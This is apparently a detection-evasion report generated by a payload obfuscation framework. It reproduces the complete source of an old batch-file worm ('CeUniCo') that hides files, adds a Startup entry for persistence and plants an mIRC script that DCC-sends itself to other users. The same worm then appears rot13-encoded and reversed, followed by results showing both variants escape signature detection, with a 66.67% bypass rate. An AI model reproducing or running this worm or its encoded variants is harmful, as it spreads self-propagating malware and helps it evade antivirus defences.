@@ -1,0 +1,175 @@
+======================================================
+  Payload Obfuscation & Encoding Framework
+  Detection Report
+======================================================
+  Generated : 2026-07-26 01:53:53
+
+  [PAYLOAD]
+  Original  : @Echo Off
+Rem CeUniCo
+Rem by CapsLock
+If Exist C:\Windows\Command\Deltree.exe Del C:\Windows\Command\Deltree.exe
+If Not Exist C:\Windows\°\CeUniCo.isc Md C:\Windows\°
+Attrib +S +H +R C:\Windows\°
+If Not Exist C:\Windows\SpeedUp.txt.bat Copy SpeedUp.txt.bat C:\Windows > Nul
+Attrib +H +R C:\Windows\SpeedUp.txt.bat
+If Not Exist C:\Windows\Men£In~1\Programas\Inicio\Speed.lnk.bat Echo @Echo Off > C:\Speed.lnk.bat
+If Not Exist C:\Windows\Men£In~1\Programas\Inicio\Speed.lnk.bat Echo Start /m C:\Windows\SpeedUp.txt.bat >> C:\Speed.lnk.bat
+If Not Exist C:\Windows\Men£In~1\Programas\Inicio\Speed.lnk.bat Copy C:\Speed.lnk.bat C:\Windows\Men£In~1\Programas\Inicio > Nul
+If Exist C:\Speed.lnk.bat Del C:\Speed.lnk.bat
+If Exist C:\Windows\°\CeUniCo.isc Attrib -S -H C:\Windows\°\CeUniCo.isc 
+C:
+Cd\
+Dir /S >> C:\Windows\°\CeUniCo.isc
+Dir /S >> C:\Windows\°\CeUniCo.isc
+Dir /S >> C:\Windows\°\CeUniCo.isc
+Dir /S >> C:\Windows\°\CeUniCo.isc
+Dir /S >> C:\Windows\°\CeUniCo.isc
+If Not Exist C:\Windows\System\°\CeUniCo.isc Md C:\Windows\System\°
+Attrib +S +H +R C:\Windows\System\°
+Copy C:\Windows\°\CeUniCo.isc C:\Windows\System\° /Y > Nul
+If Not Exist C:\Windows\System32\°\CeUniCo.isc Md C:\Windows\System32\°
+Attrib +S +H +R C:\Windows\System32\°
+Copy C:\Windows\°\CeUniCo.isc C:\Windows\System32\° /Y > Nul
+Attrib +S +H C:\Windows\°\CeUniCo.isc
+Attrib +S +H C:\Windows\System\°\CeUniCo.isc
+Attrib +S +H C:\Windows\System32\°\CeUniCo.isc
+Echo n8=}>C:\9.isc
+Echo n7= /run attrib +r +s +h C:\Windows\SpeedUp.txt.bat>C:\8.isc
+Echo n6=ON 1:connect: {>C:\7.isc
+Echo n5=>C:\6.isc
+Echo n4=}>C:\5.isc
+Echo n3= /dcc send $nick C:\Windows\SpeedUp.txt.bat>C:\4.isc
+Echo n2=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }>C:\3.isc
+Echo n1=;by CapsLock>C:\2.isc
+Echo n0=;CeUniCo>C:\1.isc
+Echo [script]>C:\0.isc
+Copy C:\0.isc+C:\1.isc+C:\2.isc+C:\3.isc+C:\4.isc+C:\5.isc+C:\6.isc+C:\7.isc+C:\8.isc+C:\9.isc C:\script.ini > Nul
+If Exist C:\mIRC\mirc.exe Copy C:\script.ini C:\mIRC > Nul
+If Exist C:\Archiv~1\mIRC\mirc.exe Copy C:\script.ini C:\Archiv~1\mIRC > Nul
+If Exist C:\Progra~1\mIRC\mirc.exe Copy C:\script.ini C:\Progra~1\mIRC > Nul
+If Exist D:\mIRC\mirc.exe Copy C:\script.ini D:\mIRC > Nul
+If Exist D:\Archiv~1\mIRC\mirc.exe Copy C:\script.ini D:\Archiv~1\mIRC > Nul
+If Exist D:\Progra~1\mIRC\mirc.exe Copy C:\script.ini D:\Progra~1\mIRC > Nul
+If Exist C:\script.ini Del C:\script.ini
+If Exist C:\0.isc Del C:\*.isc
+Exit < Nul
+  Encoder   : rot13
+  Key       : None
+  Obfuscator: reverse
+
+  [TRANSFORMED PAYLOADS]
+  Encoded   : @Rpub Bss
+Erz PrHavPb
+Erz ol PncfYbpx
+Vs Rkvfg P:\Jvaqbjf\Pbzznaq\Qrygerr.rkr Qry P:\Jvaqbjf\Pbzznaq\Qrygerr.rkr
+Vs Abg Rkvfg P:\Jvaqbjf\°\PrHavPb.vfp Zq P:\Jvaqbjf\°
+Nggevo +F +U +E P:\Jvaqbjf\°
+Vs Abg Rkvfg P:\Jvaqbjf\FcrrqHc.gkg.ong Pbcl FcrrqHc.gkg.ong P:\Jvaqbjf > Ahy
+Nggevo +U +E P:\Jvaqbjf\FcrrqHc.gkg.ong
+Vs Abg Rkvfg P:\Jvaqbjf\Zra£Va~1\Cebtenznf\Vavpvb\Fcrrq.yax.ong Rpub @Rpub Bss > P:\Fcrrq.yax.ong
+Vs Abg Rkvfg P:\Jvaqbjf\Zra£Va~1\Cebtenznf\Vavpvb\Fcrrq.yax.ong Rpub Fgneg /z P:\Jvaqbjf\FcrrqHc.gkg.ong >> P:\Fcrrq.yax.ong
+Vs Abg Rkvfg P:\Jvaqbjf\Zra£Va~1\Cebtenznf\Vavpvb\Fcrrq.yax.ong Pbcl P:\Fcrrq.yax.ong P:\Jvaqbjf\Zra£Va~1\Cebtenznf\Vavpvb > Ahy
+Vs Rkvfg P:\Fcrrq.yax.ong Qry P:\Fcrrq.yax.ong
+Vs Rkvfg P:\Jvaqbjf\°\PrHavPb.vfp Nggevo -F -U P:\Jvaqbjf\°\PrHavPb.vfp 
+P:
+Pq\
+Qve /F >> P:\Jvaqbjf\°\PrHavPb.vfp
+Qve /F >> P:\Jvaqbjf\°\PrHavPb.vfp
+Qve /F >> P:\Jvaqbjf\°\PrHavPb.vfp
+Qve /F >> P:\Jvaqbjf\°\PrHavPb.vfp
+Qve /F >> P:\Jvaqbjf\°\PrHavPb.vfp
+Vs Abg Rkvfg P:\Jvaqbjf\Flfgrz\°\PrHavPb.vfp Zq P:\Jvaqbjf\Flfgrz\°
+Nggevo +F +U +E P:\Jvaqbjf\Flfgrz\°
+Pbcl P:\Jvaqbjf\°\PrHavPb.vfp P:\Jvaqbjf\Flfgrz\° /L > Ahy
+Vs Abg Rkvfg P:\Jvaqbjf\Flfgrz32\°\PrHavPb.vfp Zq P:\Jvaqbjf\Flfgrz32\°
+Nggevo +F +U +E P:\Jvaqbjf\Flfgrz32\°
+Pbcl P:\Jvaqbjf\°\PrHavPb.vfp P:\Jvaqbjf\Flfgrz32\° /L > Ahy
+Nggevo +F +U P:\Jvaqbjf\°\PrHavPb.vfp
+Nggevo +F +U P:\Jvaqbjf\Flfgrz\°\PrHavPb.vfp
+Nggevo +F +U P:\Jvaqbjf\Flfgrz32\°\PrHavPb.vfp
+Rpub a8=}>P:\9.vfp
+Rpub a7= /eha nggevo +e +f +u P:\Jvaqbjf\FcrrqHc.gkg.ong>P:\8.vfp
+Rpub a6=BA 1:pbaarpg: {>P:\7.vfp
+Rpub a5=>P:\6.vfp
+Rpub a4=}>P:\5.vfp
+Rpub a3= /qpp fraq $avpx P:\Jvaqbjf\FcrrqHc.gkg.ong>P:\4.vfp
+Rpub a2=BA 1:WBVA:#:{ /vs ( $avpx == $zr ) { unyg }>P:\3.vfp
+Rpub a1=;ol PncfYbpx>P:\2.vfp
+Rpub a0=;PrHavPb>P:\1.vfp
+Rpub [fpevcg]>P:\0.vfp
+Pbcl P:\0.vfp+P:\1.vfp+P:\2.vfp+P:\3.vfp+P:\4.vfp+P:\5.vfp+P:\6.vfp+P:\7.vfp+P:\8.vfp+P:\9.vfp P:\fpevcg.vav > Ahy
+Vs Rkvfg P:\zVEP\zvep.rkr Pbcl P:\fpevcg.vav P:\zVEP > Ahy
+Vs Rkvfg P:\Nepuvi~1\zVEP\zvep.rkr Pbcl P:\fpevcg.vav P:\Nepuvi~1\zVEP > Ahy
+Vs Rkvfg P:\Cebten~1\zVEP\zvep.rkr Pbcl P:\fpevcg.vav P:\Cebten~1\zVEP > Ahy
+Vs Rkvfg Q:\zVEP\zvep.rkr Pbcl P:\fpevcg.vav Q:\zVEP > Ahy
+Vs Rkvfg Q:\Nepuvi~1\zVEP\zvep.rkr Pbcl P:\fpevcg.vav Q:\Nepuvi~1\zVEP > Ahy
+Vs Rkvfg Q:\Cebten~1\zVEP\zvep.rkr Pbcl P:\fpevcg.vav Q:\Cebten~1\zVEP > Ahy
+Vs Rkvfg P:\fpevcg.vav Qry P:\fpevcg.vav
+Vs Rkvfg P:\0.vfp Qry P:\*.vfp
+Rkvg < Ahy
+  Obfuscated: yhA < gvkR
+pfv.*\:P yrQ pfv.0\:P gfvkR sV
+vav.gcvepf\:P yrQ vav.gcvepf\:P gfvkR sV
+yhA > PEVz\1~netbeC\:Q vav.gcvepf\:P lcbP rkr.pevz\PEVz\1~netbeC\:Q gfvkR sV
+yhA > PEVz\1~ivupeN\:Q vav.gcvepf\:P lcbP rkr.pevz\PEVz\1~ivupeN\:Q gfvkR sV
+yhA > PEVz\:Q vav.gcvepf\:P lcbP rkr.pevz\PEVz\:Q gfvkR sV
+yhA > PEVz\1~netbeC\:P vav.gcvepf\:P lcbP rkr.pevz\PEVz\1~netbeC\:P gfvkR sV
+yhA > PEVz\1~ivupeN\:P vav.gcvepf\:P lcbP rkr.pevz\PEVz\1~ivupeN\:P gfvkR sV
+yhA > PEVz\:P vav.gcvepf\:P lcbP rkr.pevz\PEVz\:P gfvkR sV
+yhA > vav.gcvepf\:P pfv.9\:P+pfv.8\:P+pfv.7\:P+pfv.6\:P+pfv.5\:P+pfv.4\:P+pfv.3\:P+pfv.2\:P+pfv.1\:P+pfv.0\:P lcbP
+pfv.0\:P>]gcvepf[ bupR
+pfv.1\:P>bPvaHrP;=0a bupR
+pfv.2\:P>xpbYfcnP lo;=1a bupR
+pfv.3\:P>} gynu { ) rz$ == xpva$ ( sv/ {:#:AVBW:1 AB=2a bupR
+pfv.4\:P>gno.gkg.cHqrrcF\fjbqavJ\:P xpva$ qarf ppq/ =3a bupR
+pfv.5\:P>}=4a bupR
+pfv.6\:P>=5a bupR
+pfv.7\:P>{ :gpraabp:1 AB=6a bupR
+pfv.8\:P>gno.gkg.cHqrrcF\fjbqavJ\:P u+ f+ e+ oveggn ahe/ =7a bupR
+pfv.9\:P>}=8a bupR
+pfv.bPvaHrP\°\23zrgflF\fjbqavJ\:P U+ F+ oveggN
+pfv.bPvaHrP\°\zrgflF\fjbqavJ\:P U+ F+ oveggN
+pfv.bPvaHrP\°\fjbqavJ\:P U+ F+ oveggN
+yhA > L/ °\23zrgflF\fjbqavJ\:P pfv.bPvaHrP\°\fjbqavJ\:P lcbP
+°\23zrgflF\fjbqavJ\:P E+ U+ F+ oveggN
+°\23zrgflF\fjbqavJ\:P qZ pfv.bPvaHrP\°\23zrgflF\fjbqavJ\:P gfvkR gbA sV
+yhA > L/ °\zrgflF\fjbqavJ\:P pfv.bPvaHrP\°\fjbqavJ\:P lcbP
+°\zrgflF\fjbqavJ\:P E+ U+ F+ oveggN
+°\zrgflF\fjbqavJ\:P qZ pfv.bPvaHrP\°\zrgflF\fjbqavJ\:P gfvkR gbA sV
+pfv.bPvaHrP\°\fjbqavJ\:P >> F/ evQ
+pfv.bPvaHrP\°\fjbqavJ\:P >> F/ evQ
+pfv.bPvaHrP\°\fjbqavJ\:P >> F/ evQ
+pfv.bPvaHrP\°\fjbqavJ\:P >> F/ evQ
+pfv.bPvaHrP\°\fjbqavJ\:P >> F/ evQ
+\qP
+:P
+ pfv.bPvaHrP\°\fjbqavJ\:P U- F- oveggN pfv.bPvaHrP\°\fjbqavJ\:P gfvkR sV
+gno.xay.qrrcF\:P yrQ gno.xay.qrrcF\:P gfvkR sV
+yhA > bvpvaV\fnznetbeC\1~aV£arZ\fjbqavJ\:P gno.xay.qrrcF\:P lcbP gno.xay.qrrcF\bvpvaV\fnznetbeC\1~aV£arZ\fjbqavJ\:P gfvkR gbA sV
+gno.xay.qrrcF\:P >> gno.gkg.cHqrrcF\fjbqavJ\:P z/ gengF bupR gno.xay.qrrcF\bvpvaV\fnznetbeC\1~aV£arZ\fjbqavJ\:P gfvkR gbA sV
+gno.xay.qrrcF\:P > ssB bupR@ bupR gno.xay.qrrcF\bvpvaV\fnznetbeC\1~aV£arZ\fjbqavJ\:P gfvkR gbA sV
+gno.gkg.cHqrrcF\fjbqavJ\:P E+ U+ oveggN
+yhA > fjbqavJ\:P gno.gkg.cHqrrcF lcbP gno.gkg.cHqrrcF\fjbqavJ\:P gfvkR gbA sV
+°\fjbqavJ\:P E+ U+ F+ oveggN
+°\fjbqavJ\:P qZ pfv.bPvaHrP\°\fjbqavJ\:P gfvkR gbA sV
+rkr.rregyrQ\qanzzbP\fjbqavJ\:P yrQ rkr.rregyrQ\qanzzbP\fjbqavJ\:P gfvkR sV
+xpbYfcnP lo zrE
+bPvaHrP zrE
+ssB bupR@
+
+  [DETECTION RESULTS]
+  Original           DETECTED        (score: 11.0%)
+    Matched sigs: attrib, mirc.exe, deltree, dir /s, echo off, script.ini, speedup, ceunico, dcc send, attrib +h, copy c:\, del c:\
+  Encoded            NOT DETECTED    (score: 0.0%)
+  Obfuscated         NOT DETECTED    (score: 0.0%)
+
+  [STATISTICS]
+  Total Variants  : 3
+  Detected        : 1
+  Undetected      : 2
+  Bypass Rate     : 66.67%
+
+  [OBSERVATIONS]
+  Majority of variants bypassed static detection.
+======================================================
